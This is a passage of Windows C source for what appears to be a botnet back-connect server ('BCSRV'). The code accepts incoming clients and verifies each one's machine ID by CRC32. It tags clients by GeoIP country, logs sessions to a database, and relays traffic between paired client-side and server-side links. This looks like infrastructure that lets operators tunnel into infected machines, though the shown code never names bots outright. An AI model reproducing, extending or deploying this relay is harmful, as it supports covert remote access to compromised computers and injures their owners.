		pEntry = pEntry->Flink;
		RemoveEntryList(&pLink->Entry);
		pSession->FreeLinks -= 1;
#if _DEBUG
		// Decrementing number of links before dereferencing the session
		InterlockedDecrement(&pSession->pServer->NumberOfLinks);
		pLink->Header.Magic = ~BC_LINK_MAGIC;
#endif
		// Freeing memory
		vFree(pLink);
	}	// while(pEntry != &pSession->FreeLinksList)

	ASSERT(pSession->FreeLinks == 0);

	if (pSession->BcRecord.Flags & BC_RECORD_FLAG_ACTIVE)
	{
		pSession->BcRecord.Flags &= (~BC_RECORD_FLAG_ACTIVE);
		BcUpdateRecord(pSession->pServer, &pSession->BcRecord);	
	}

	DeleteCriticalSection(&pSession->SessionLock);

	DbgPrint("BCSRV: Session 0x%p terminated.\n", pSession);
#if _DEBUG
	pSession->Header.Magic = ~BC_SESSION_MAGIC;
#endif
	InterlockedDecrement(&pSession->pServer->NumberOfSessions);

	UNREFERENCED_PARAMETER(UserContext);
	return(TRUE);
}

//
//	Initiates asynchronous Accept operation over the specfied BC port.
//
WINERROR BcAcceptPort(
	PBC_PORT	pPort
	)
{
	WINERROR Status = NO_ERROR;
	
	if ((pPort->aSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET)
	{
		LPOVERLAPPED pOverlapped = &pPort->BcOverlapped.Overlapped;

		if (AcceptEx(pPort->Socket, pPort->aSocket, &pPort->Address, 0, 0, sizeof(ACCEPT_ADDRESS_EX), (LPDWORD)&pOverlapped->InternalHigh, pOverlapped) || 
			((Status = GetLastError()) == ERROR_IO_PENDING))
		{
				Status = NO_ERROR;
		}
		else
			closesocket(pPort->aSocket);
	}	// if ((pPort->aSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET)
	else
		Status = GetLastError();

	return(Status);
}


//
//	Creates new BC session or attaches a link to an existing one.
//
WINERROR BcCreateSession(
	PBC_HANDSHAKE	pBcHandshake
	)
{
	WINERROR	Status = ERROR_FILE_NOT_FOUND;
	PBC_SESSION	pSession;

	ASSERT_BC_HANDSHAKE(pBcHandshake);

	if (pSession = BcAddSession(pBcHandshake))
	{
		// The session has just been created, continue it's initialization
		if ((Status = BcInitPort(pSession->pServer, &pSession->Port)) == NO_ERROR)
		{
			if (CreateIoCompletionPort((HANDLE)pSession->Port.Socket, pSession->pServer->hIoCompletionPort, (ULONG_PTR)pSession, 0))
			{
				if (!listen(pSession->Port.Socket, SOMAXCONN))
				{
					// Initializing BC_RECORD structure
					pBcHandshake->BcRecord.ClientPort = pSession->Port.Number;
					GetSystemTime(&pBcHandshake->BcRecord.LastAccessTime);
					pBcHandshake->BcRecord.Flags = BC_RECORD_FLAG_ACTIVE;

					memcpy(&pSession->BcRecord, &pBcHandshake->BcRecord, sizeof(BC_RECORD));

					DbgPrint("BCSRV: Session 0x%p for client port %u created successfully.\n", pSession, pBcHandshake->BcRecord.ClientPort);
					
					// Updating session's DB record
					if (!(pSession->pServer->GeoipHandle) || 
						BcQueryIpOriginCode(pSession->pServer, pSession->BcRecord.Address, (LPSTR)&pSession->BcRecord.CountryCode, sizeof(pSession->BcRecord.CountryCode)) != NO_ERROR)
						pSession->BcRecord.CountryCode[0] = 0;
					BcUpdateRecord(pSession->pServer, &pSession->BcRecord);

					// Referencing the session here because BcAcceptPort() can complete asynchronously and in case of an error the session 
					//	can be dereferenced there
					BcReferenceSession(pSession);

					pSession->Port.BcOverlapped.pControlObject = &pSession->Header;
					
					if ((Status = BcAcceptPort(&pSession->Port)) == NO_ERROR)
						BcAddLink(pSession, pBcHandshake->Socket, BC_SERVER_SIDE);

					BcDereferenceSession(pSession);
				}	// if (!listen(pSession->Port.Socket, SOMAXCONN))
				else
					Status = GetLastError();
			}	// if (CreateIoCompletionPort((HANDLE)pSession->Port.Socket...
			else
				Status = GetLastError();
		}	// if ((Status = BcInitPort(&pSession->Port)) == NO_ERROR)

		if (Status != NO_ERROR)
			// Session initialization failed
			BcDereferenceSession(pSession);
	}
	else if (pSession = BcFindSession(pBcHandshake))
	{
		// Attaching a link to an existing session
		if (BcAddLink(pSession, pBcHandshake->Socket, BC_SERVER_SIDE))
			// Update session pending time only if there was a link added successfully
			GetSystemTimeAsFileTime((LPFILETIME)&pSession->PendingTime);

		BcDereferenceSession(pSession);
		Status = NO_ERROR;
	}
	else
	{
		// Something goes wrong, possibly we have not enough memory.
//		ASSERT(FALSE);
	}

	return(Status);
}

VOID BcDereferenceHandshake(
	PBC_HANDSHAKE	pBcHandshake
	)
{
	ASSERT_BC_HANDSHAKE(pBcHandshake);
	ASSERT(pBcHandshake->Header.ReferenceCount > 0);

	if (InterlockedDecrement(&pBcHandshake->Header.ReferenceCount) == 0)
	{
#if _DEBUG
		pBcHandshake->Header.Magic = ~BC_HANDSHAKE_MAGIC;
		InterlockedDecrement(&pBcHandshake->pServer->NumberOfHandshakes);
#endif
		hFree(pBcHandshake);
	}
}

//
//	Initiates BC handshake for a new session
//	
WINERROR BcStartHandshake(
	PBC_SERVER		pServer,		// Current server structure
	PBC_PORT		pPort,			// BC_PORT for the handshake
	SOCKADDR_IN*	ClientAddress	// Address of the client connected
	)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	PBC_HANDSHAKE	pBcHandshake;
	BOOL NbIo = TRUE;

	if (pBcHandshake = hAlloc(sizeof(BC_HANDSHAKE)))
	{
		// Initializing handshake structure
		memset(pBcHandshake, 0, sizeof(BC_HANDSHAKE));
		pBcHandshake->Header.Magic = BC_HANDSHAKE_MAGIC;
		pBcHandshake->Header.ReferenceCount = 1;

		pBcHandshake->pServer = pServer;
		pBcHandshake->Socket = pPort->aSocket;
		pBcHandshake->BcRecord.Address = ClientAddress->sin_addr.S_un.S_addr;
		pBcHandshake->BcRecord.ServerPort = pPort->Number;
		pBcHandshake->BcOverlapped.pControlObject = &pBcHandshake->Header;
		InitializeListHead(&pBcHandshake->Entry);
#if _DEBUG
		InterlockedIncrement(&pServer->NumberOfHandshakes);
#endif
		// Switching the control socket to non-blocking mode
		ioctlsocket(pPort->aSocket, FIONBIO, &NbIo);

		// Adding the control socket to server's IO completion port
		if (CreateIoCompletionPort((HANDLE)pPort->aSocket, pServer->hIoCompletionPort, (ULONG_PTR)&pBcHandshake->Header, 0))
		{
			BOOL Ret;

			GetSystemTimeAsFileTime((LPFILETIME)&pBcHandshake->PendingTime);

			EnterCriticalSection(&pServer->HandshakeListLock);
			InsertTailList(&pServer->HandshakeListHead, &pBcHandshake->Entry);
			LeaveCriticalSection(&pServer->HandshakeListLock);

			// ReadFile can complete asynchronously before the function returns, that's why we use reference counter here
			//	to avoid pBcHandshake being deleted by a completion routine.
			pBcHandshake->Header.ReferenceCount += 1;

			// Initiating handshake: receiving client ID
			Ret = ReadFile(
				(HANDLE)pPort->aSocket,
				(PCHAR)&pBcHandshake->BcRecord.UserId, 
				sizeof(BC_ID), 
				(LPDWORD)&pBcHandshake->BcOverlapped.Overlapped.InternalHigh, 
				&pBcHandshake->BcOverlapped.Overlapped
				);

			if (Ret || ((Status = GetLastError()) == ERROR_IO_PENDING))
				Status = NO_ERROR;
			else
			{
				DbgPrint("BCSRV: Receiving BC handshake failed, error %u\n", Status);
				EnterCriticalSection(&pServer->HandshakeListLock);
				RemoveEntryList(&pBcHandshake->Entry);
				LeaveCriticalSection(&pServer->HandshakeListLock);
			}

			BcDereferenceHandshake(pBcHandshake);

		}	// if (CreateIoCompletionPort(...
		else
			Status = GetLastError();

		if (Status != NO_ERROR)
			BcDereferenceHandshake(pBcHandshake);
	}	// if (pBcHandshake = vAlloc(sizeof(BC_HANDSHAKE)))

	return(Status);
}


//
//	Completes BC session handshake. 
//	Saves received client ID. Returns a pair of TCP port numbers to the client.
//
WINERROR BcCompleteHandshake(
	PBC_HANDSHAKE	pBcHandshake,
	BOOL			bSuccess
	)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;

	ASSERT_BC_HANDSHAKE(pBcHandshake);
	ASSERT(pBcHandshake->BcOverlapped.pControlObject == &pBcHandshake->Header);

	if (bSuccess)
	{
		if ((pBcHandshake->Read += (ULONG)pBcHandshake->BcOverlapped.Overlapped.InternalHigh) == sizeof(BC_ID))
		{
			// Removing the handshake from the pending list
			EnterCriticalSection(&pBcHandshake->pServer->HandshakeListLock);
			RemoveEntryList(&pBcHandshake->Entry);
			LeaveCriticalSection(&pBcHandshake->pServer->HandshakeListLock);

			Status = ERROR_INVALID_PARAMETER;

			// Checking if the handshake was not terminated by WatchHandshakes() function yet 
			if (pBcHandshake->Socket != INVALID_SOCKET)
			{
				// We received a client ID, verifying it
				if (Crc32((PCHAR)&pBcHandshake->BcRecord.UserId.MachineId, sizeof(BC_MACHINE_ID)) == pBcHandshake->BcRecord.UserId.Crc32)
					// Creating a new session
					Status = BcCreateSession(pBcHandshake);

				if (Status != NO_ERROR)
					InterlockedShutdownSocket(&pBcHandshake->Socket);
			}	// if (pBcHandshake->Socket != INVALID_SOCKET)

			BcDereferenceHandshake(pBcHandshake);

			return(Status);
		}	// if ((pBcHandshake->Read += pBcHandshake->Overlapped.InternalHigh) == sizeof(BC_ID))
		else
		{
			// Not whole client ID received, continue
			if (pBcHandshake->BcOverlapped.Overlapped.InternalHigh != 0)
			{
				BOOL Ret;

				Ret = ReadFile(
					(HANDLE)pBcHandshake->Socket, 
					(PCHAR)&pBcHandshake->BcRecord.UserId + pBcHandshake->Read, 
					sizeof(BC_ID) - pBcHandshake->Read, 
					(LPDWORD)&pBcHandshake->BcOverlapped.Overlapped.InternalHigh, 
					&pBcHandshake->BcOverlapped.Overlapped
					);

				if (Ret || ((Status = GetLastError()) == ERROR_IO_PENDING))
					Status = NO_ERROR;
			}	// if (pBcHandshake->Overlapped.InternalHigh != 0)
			else
			{
				// The connection is closed
				ASSERT(Status != NO_ERROR);
			}
		}
	}	// if (bSuccess)
	
	if (Status != NO_ERROR)
	{
		InterlockedShutdownSocket(&pBcHandshake->Socket);

		EnterCriticalSection(&pBcHandshake->pServer->HandshakeListLock);
		RemoveEntryList(&pBcHandshake->Entry);
		LeaveCriticalSection(&pBcHandshake->pServer->HandshakeListLock);

		BcDereferenceHandshake(pBcHandshake);
	}

	return(Status);
}


VOID BcCheckPendingSession(
	PBC_SESSION		pSession,
	PLARGE_INTEGER	pSystemTime
	)
{
	PBC_SERVER pServer = pSession->pServer;

	ASSERT_BC_SESSION(pSession);

	if ((pSession->PendingTime.QuadPart) && 
		(pSystemTime->QuadPart - pSession->PendingTime.QuadPart) > _SECONDS(BC_PENDING_SESSION_TIMEOUT))
	{
		// Session timeout expired
		if (pSession->ActiveLinks == 0 || pSession->ServerLinks == 0)
		{
			// Checking if pending links are still connected
			BcCheckPendingLinks(pSession);
			if (pSession->ServerLinks == 0)
			{
				// The session was pending too long, terminating it
				DbgPrint("BCSRV: Session 0x%p timeout expired.\n", pSession);
				BcTerminateSession(pSession, FALSE);
			}
		}	// if (pSession->ActiveLinks == 0)
		else
			pSession->PendingTime.QuadPart = pSystemTime->QuadPart;
	}
}


//
//	Scans session list for sessions which are being pending for too long or are terminated.
//	Removes found sessions, cleans up session data.
//
VOID BcWatchSessions(	
	PBC_SERVER		pServer,	// Current server structure
	PLARGE_INTEGER	pSystemTime
	)
{
	ULONG			Index = 0, Count = BC_SESSION_WATCH_COUNT;
	PBC_SESSION		pSession, pNext;

	if (pSession = BcEnumSessions(pServer, NULL, Index))
	{
		do
		{
			if ((pSystemTime->QuadPart - pSession->UpdateTime.QuadPart) > _SECONDS(BC_SESSION_UPDATE_TIMEOUT))
			{
#ifdef	_BC_CHECK_ACTIVE_LINKS
				BcCheckActiveLinks(pSession, pSystemTime);
#endif
				BcUpdateSessionLoad(pSession);
				pSession->UpdateTime.QuadPart = pSystemTime->QuadPart;
			}

			BcCheckPendingSession(pSession, pSystemTime);

			pNext = BcEnumSessions(pServer, pSession, 0);
			BcDereferenceSession(pSession);
		} while((Count -= 1) && (pSession = pNext));
	}	// if (pSession = BcEnumSessions(pServer, NULL, Index))
}


VOID BcWatchHandshakes(
	PBC_SERVER		pServer,	// Current server structure
	PLARGE_INTEGER	pSystemTime
	)
{
	PLIST_ENTRY	pEntry;

	if (!IsListEmpty(&pServer->HandshakeListHead))
	{
		EnterCriticalSection(&pServer->HandshakeListLock);

		pEntry = pServer->HandshakeListHead.Flink;
		while(pEntry != &pServer->HandshakeListHead)
		{
			PBC_HANDSHAKE	pHandshake = CONTAINING_RECORD(pEntry, BC_HANDSHAKE, Entry);

			ASSERT_BC_HANDSHAKE(pHandshake);

			if (!pSystemTime || ((pSystemTime->QuadPart - pHandshake->PendingTime.QuadPart) > _SECONDS(BC_PENDING_SESSION_TIMEOUT)))
			{
//				pServer->LastPendingAddress = pHandshake->BcRecord.Address;
				InterlockedShutdownSocket(&pHandshake->Socket);
				DbgPrint("BCSRV: Pending handshake shut down.\n");
			}

			pEntry = pEntry->Flink;
		}

		LeaveCriticalSection(&pServer->HandshakeListLock);
	}	// if (!IsListEmpty(&pServer->HandshakeListHead))
}


#if _DBG
 static LONG volatile g_IoWorkersCount = 0;
 static LONG volatile g_IoWorkersMax = 0;
#endif

//
//	Server IO completion thread. 
//	Processes connection accept and data send-receives operations.
//
WINERROR WINAPI BcIoCompletionWorker(
	PBC_SERVER	pServer
	)
{
	WINERROR		Status = NO_ERROR;
	BOOL			bWatching = FALSE, Ret;
	ULONG			Side;
	PBC_SESSION		pSession;
	PBC_PORT		pPort;
	SOCKADDR_IN*	pAddr, pLocal;
	ULONG			AddrLen, LocalLen;

	do
	{	
		ULONG			Transfered = 0;
		LPOVERLAPPED	pOverlapped = NULL;
		ULONG_PTR		CompletionKey = 1;	// anything but not 0

		Ret = GetQueuedCompletionStatus(pServer->hIoCompletionPort, &Transfered, &CompletionKey, &pOverlapped, BC_SESSION_WATCH_TIME);

#if _DBG
		if (Ret)
			Status = NO_ERROR;
		else
			Status = GetLastError();
#endif

		// Checking if there's an error occured or a timeout exceeded
		if (pOverlapped)
		{
			PBC_OVERLAPPED	pBcOverlapped;
			PBC_HEADER		pHeader;
#if _DBG
			LONG			WorkersCount;

			WorkersCount = InterlockedIncrement(&g_IoWorkersCount);
			if (WorkersCount > g_IoWorkersMax)
				g_IoWorkersMax = WorkersCount;
#endif
			pBcOverlapped = CONTAINING_RECORD(pOverlapped, BC_OVERLAPPED, Overlapped);
			pHeader = pBcOverlapped->pControlObject;

			switch(pHeader->Magic)
			{
			case BC_LINK_MAGIC:
				{
					// Processing BC-Link read/write
					PBC_LINK	pLink = CONTAINING_RECORD(pHeader, BC_LINK, Header);
					PBC_CONTEXT	pContext;

					ASSERT_BC_LINK(pLink);
					ASSERT(pLink->Header.ReferenceCount > 0);

					pContext = CONTAINING_RECORD(pBcOverlapped, BC_CONTEXT, BcOverlapped);
					Side = (pContext == &pLink->Context[BC_SERVER_SIDE] ? BC_SERVER_SIDE : BC_CLIENT_SIDE);

	//				DbgPrint("BCSRV: Link 0x%p side %u operation complete\n", pLink, Side);
	 
					if (Transfered == 0)
					{
						//Client connection is gone, remove it.
	//					DbgPrint("BCSRV: Client side %u disconnected, Link: 0x%p, ctx:0x%08x, opcode %u, error %u, status %u\n", Side, pLink, (ULONG_PTR)pContext, pContext->OpCode, Ret, Status);
						BcStopLink(pLink);
						DereferenceLink(pLink, FALSE);
					}
					else
					{
						// Operation complete 
						if (pContext->OpCode == BC_CONTEXT_RECV)
						{
							GetSystemTimeAsFileTime((LPFILETIME)&pLink->TransferTime);
	//						DbgPrint("BCSRV: Link: 0x%p received %u bytes on side %u\n", pLink, Transfered, Side);

	#if _DBG
							if (Side == BC_CLIENT_SIDE)
								pLink->RecvdFromClient += Transfered;
	#endif
							if ((Status = BcLinkSend(pLink, Side)) != NO_ERROR)
								DereferenceLink(pLink, FALSE);
						}
						else if (pContext->OpCode == BC_CONTEXT_SEND)
						{
	//						DbgPrint("BCSRV: Link: 0x%p sent %u bytes on side %u\n", pLink, Transfered, Side);
	#if _DBG
							if (Side == BC_SERVER_SIDE)
								pLink->SentToClient += Transfered;
	#endif
							ASSERT(pContext->Size == Transfered);
							if ((Status = BcLinkReceive(pLink, Side)) != NO_ERROR)
								DereferenceLink(pLink, FALSE);
						}
						else
						{
							ASSERT(pContext->OpCode == BC_CONTEXT_KEEPALIVE);
							DereferenceLink(pLink, FALSE);
						}
					}	// else // if (Transfered == 0)
					break;
				}
			case BC_SESSION_MAGIC:
				{
					// Processing BC-Session request, 
					// Accept operation completes
					pSession = CONTAINING_RECORD(pHeader, BC_SESSION, Header);
					pPort = CONTAINING_RECORD(pBcOverlapped, BC_PORT, BcOverlapped);
					
					ASSERT_BC_SESSION(pSession);

					// Incoming connection accepted
					GetAcceptExSockaddrs(&pPort->Address, 0, 0, sizeof(ACCEPT_ADDRESS_EX), (struct sockaddr **)&pLocal, &LocalLen, 
						(struct sockaddr **)&pAddr, &AddrLen);

					// Referencing the session here because BcAcceptPort() can complete asynchronously and in case of an error 
					//	the session can be dereferenced there
					BcReferenceSession(pSession);

					if (BcAddLink(pSession, pPort->aSocket, BC_CLIENT_SIDE))
						// Update session pending time only if there was a link added successfully
						GetSystemTimeAsFileTime((LPFILETIME)&pSession->PendingTime);

					if ((Status = BcAcceptPort(pPort)) != NO_ERROR)
					{
						DbgPrint("BCSRV: Session 0x%p client accept failed, error %u\n", pSession, Status);
						BcTerminateSession(pSession, TRUE);
					}
					else
					{
//						DbgPrint("BCSRV: Session 0x%p client side connected: %u.%u.%u.%u:%u\n", pSession, pAddr->sin_addr.S_un.S_un_b.s_b1, pAddr->sin_addr.S_un.S_un_b.s_b2, pAddr->sin_addr.S_un.S_un_b.s_b3, pAddr->sin_addr.S_un.S_un_b.s_b4, htons(pAddr->sin_port));
					}
					BcDereferenceSession(pSession);
					break;
				}
			case BC_HANDSHAKE_MAGIC:
				{
					// Session handshake processing: client ID received.
					PBC_HANDSHAKE	pHandshake = CONTAINING_RECORD(pHeader, BC_HANDSHAKE, Header);
					ASSERT_BC_HANDSHAKE(pHandshake);
					BcCompleteHandshake(pHandshake, Ret);
					break;
				}
			case BC_SERVER_MAGIC:
				{
					// Accepting server port request
					pServer = CONTAINING_RECORD(pHeader, BC_SERVER, Header);
					pPort = CONTAINING_RECORD(pBcOverlapped, BC_PORT, BcOverlapped);
					
					ASSERT_BC_SERVER(pServer);

					// Incoming connection accepted
					GetAcceptExSockaddrs(&pPort->Address, 0, 0, sizeof(ACCEPT_ADDRESS_EX), (struct sockaddr **)&pLocal, &LocalLen, 
						(struct sockaddr **)&pAddr, &AddrLen);

//					DbgPrint("BCSRV: Incoming connection from %u.%u.%u.%u:%u\n", pAddr->sin_addr.S_un.S_un_b.s_b1, pAddr->sin_addr.S_un.S_un_b.s_b2, pAddr->sin_addr.S_un.S_un_b.s_b3, pAddr->sin_addr.S_un.S_un_b.s_b4, htons(pAddr->sin_port));

					// Checking server connection limit and creating a new session if needed
					if (pAddr->sin_addr.S_un.S_addr == pServer->LastPendingAddress || 
						(Status = BcStartHandshake(pServer, pPort, pAddr)) != NO_ERROR)
					{
						if (Status != NO_ERROR)
						{
							DbgPrint("BCSRV: Failed creating a session, error: %u\n", Status);
							Status = NO_ERROR;
						}
						else
						{
							DbgPrint("BCSRV: Failed creating a session because of the pending limit.\n");
						}
						closesocket(pPort->aSocket);
					}

					while ((Status = BcAcceptPort(pPort)) != NO_ERROR)
					{
						if (pPort->Socket == INVALID_SOCKET)
						{
							BcDereferenceServer(pServer);
							break;
						}
						else
						{
							// Something goes wrong, waiting and trying once again
							DbgPrint("BCSRV: Accept on server port failed, error %u\n", Status);
							Sleep(1000);
						}
					}	// while ((Status = BcAcceptPort(pPort)) != NO_ERROR)
						
					break;
				}
			default:
				{
					ASSERT(FALSE);
				}
			}	// switch(pHeader->Magic)
#if _DBG
			InterlockedDecrement(&g_IoWorkersCount);
#endif
		}	// if (pOverlapped)
		else
		{
			Status = GetLastError();

			if (CompletionKey == 0)
			{
				// A CompletionKey==0 was specified to PostQueuedCompletionStatus, this means we are terminating.
				break;
			}

			if (Status == ERROR_ABANDONED_WAIT_0)
				// IO Completion port handle was closed
				break;
		}

		// Checking if there's a time to scan for pending sessions
		// This is a synchronization timer, only one thread will path through it
		if (!bWatching && (WaitForSingleObject(pServer->SessionCheckTimer, 0) == WAIT_OBJECT_0))
		{
			LARGE_INTEGER	DueTime, SystemTime;

			bWatching = TRUE;
			GetSystemTimeAsFileTime((LPFILETIME)&SystemTime);

//			DbgPrint("BCSRV: Maximum number of IO workers: %u\n", g_IoWorkersMax);

			BcWatchSessions(pServer, &SystemTime);
			BcWatchHandshakes(pServer, &SystemTime);

			DueTime.QuadPart = _RELATIVE(_MILLISECONDS(BC_SESSION_WATCH_TIME));
			SetWaitableTimer(pServer->SessionCheckTimer, &DueTime, 0, NULL, NULL, FALSE);
			bWatching = FALSE;
		}

	} while(TRUE);

	return(Status);
}


//
//	Stops BC-Server. Terminates all thread. Releases memory.
//
VOID BcServerStop(
	PBC_SERVER	pServer
	)
{
	PBC_SESSION	pSession, pNext;
	PLIST_ENTRY	pEntry;

	ASSERT_BC_SERVER(pServer);

	DbgPrint("BCSRV: Stopping server...\n");

	// Stopping all server ports
	pEntry = pServer->PortListHead.Flink;
	while(pEntry != &pServer->PortListHead)
	{
		PBC_PORT pPort = CONTAINING_RECORD(pEntry, BC_PORT, Entry);

		InterlockedShutdownSocket(&pPort->Socket);
		pEntry = pEntry->Flink;
	}

	// Stopping handshakes
	BcWatchHandshakes(pServer, NULL);

	// Deleting all sessions
	DbgPrint("BCSRV: Terminating %u active sessions...\n", pServer->NumberOfSessions);

	if (pSession = BcEnumSessions(pServer, NULL, 0))
	{
		do
		{
			BcTerminateSession(pSession, FALSE);
			pNext = BcEnumSessions(pServer, pSession, 0);
			BcDereferenceSession(pSession);
		} while(pSession = pNext);
	}	// if (pSession = BcEnumSessions(pServer, NULL, 0))

	while(pServer->NumberOfSessions || pServer->Header.ReferenceCount)
		Sleep(500);

	DbgPrint("BCSRV: All sessions are terminated.\n");

	ReleaseIoCompletionPort(pServer);

	if (pServer->DbSemaphore)
		CloseHandle(pServer->DbSemaphore);
	if (pServer->SessionCheckTimer)
		CloseHandle(pServer->SessionCheckTimer);

	if (pServer->SessionTable)
		HandleReleaseTable(pServer->SessionTable);

	DbgPrint("BCSRV: Server stopped.\n");
}

//
//	Creates BC-Server main socket, binds it and starts BC-Server main thread (listener).
//
WINERROR BcServerStart(
	PBC_SERVER	pServer
	)
{
	WINERROR		Status;
	SOCKADDR_IN		Addr = {0};
	LARGE_INTEGER	DueTime;
	PLIST_ENTRY		pEntry;	

	do	// not a loop
	{
		SYSTEM_INFO	SysInfo;

#ifndef _DEBUG
		srand(GetTickCount());
#endif

		GetSystemInfo(&SysInfo);

		InitializeCriticalSection(&pServer->HandshakeListLock);
		InitializeListHead(&pServer->HandshakeListHead);

		if ((Status = HandleAllocateTable(&pServer->SessionTable, sizeof(BC_SESSION), &BcOnSessionCreate, &BcOnSessionDelete)) != NO_ERROR)
			break;

		if ((Status = InitIoCompletionPort(pServer, (BC_NUMBER_OF_WORKERS * SysInfo.dwNumberOfProcessors), pServer, &BcIoCompletionWorker)) != NO_ERROR)
			break;

		Status = ERROR_UNSUCCESSFULL;

		if (!(pServer->SessionCheckTimer = CreateWaitableTimer(NULL, FALSE, NULL)))
		{
			DbgPrint("BCSRV: Unable to create Session Check timer\n");
			break;
		}

		DueTime.QuadPart = _RELATIVE(_MILLISECONDS(BC_SESSION_WATCH_TIME));
		SetWaitableTimer(pServer->SessionCheckTimer, &DueTime, 0, NULL, NULL, FALSE);

		if (!(pServer->DbSemaphore = CreateSemaphore(NULL, pServer->DbConnectLimit, pServer->DbConnectLimit, NULL)))
		{
			DbgPrint("BCSRV: Unable to create DB connection semaphore\n");
			break;
		}

		// Creating and binding server ports
		Addr.sin_family = AF_INET;
		pEntry = pServer->PortListHead.Flink;
		do
		{
			PBC_PORT pPort = CONTAINING_RECORD(pEntry, BC_PORT, Entry);
			Status = ERROR_UNSUCCESSFULL;

			if ((pPort->Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
			{
				DbgPrint("BCSRV: Unable to create server socket for port %u\n", pPort->Number);
				break;
			}

			Addr.sin_port = htons(pPort->Number);

			if (bind(pPort->Socket, (struct sockaddr*)&Addr, sizeof(SOCKADDR_IN)))
			{
				DbgPrint("BCSRV: Unable to bind server socket to port %u\n", pPort->Number);
				break;
			}

			if (listen(pPort->Socket, SOMAXCONN))
			{
				DbgPrint("BCSRV: Listen on port %u failed\n", pPort->Number);
				break;
			}

			if (!CreateIoCompletionPort((HANDLE)pPort->Socket, pServer->hIoCompletionPort, (ULONG_PTR)pServer, 0))
			{
				DbgPrint("BCSRV: Failed creating IO completion port\n");
				break;
			}

			BcReferenceServer(pServer);

			pPort->BcOverlapped.pControlObject = &pServer->Header;
			Status = BcAcceptPort(pPort);
			if (Status != NO_ERROR)
			{
				BcDereferenceServer(pServer);
				break;
			}

			pEntry = pEntry->Flink;
		} while(pEntry != &pServer->PortListHead);

	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	return(Status);
}
